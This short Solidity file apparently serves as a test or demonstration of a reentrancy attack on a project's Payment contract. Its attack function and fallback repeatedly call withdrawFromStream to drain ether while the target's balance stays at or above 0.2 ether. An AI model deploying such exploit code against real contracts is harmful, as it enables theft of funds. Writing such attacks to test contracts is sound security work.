pragma solidity 0.8.10;

//  SPDX-License-Identifier: UNLICENSED

import "../Payment.sol";


contract ReEntrancy {

    Payment _payment;


    constructor(address _paymentContractAddress) {

        _payment = Payment(_paymentContractAddress);
    }

    //  contract recieving ether should have a fallback or receive function but payable
   
   

    fallback() external payable{

        // attack implementation

        if(address(_payment).balance >= 0.2 ether) {

            _payment.withdrawFromStream(0);
           

        }
          
    }

    

    function attack() external {
        
         _payment.withdrawFromStream(0);        

    }

   
 
}



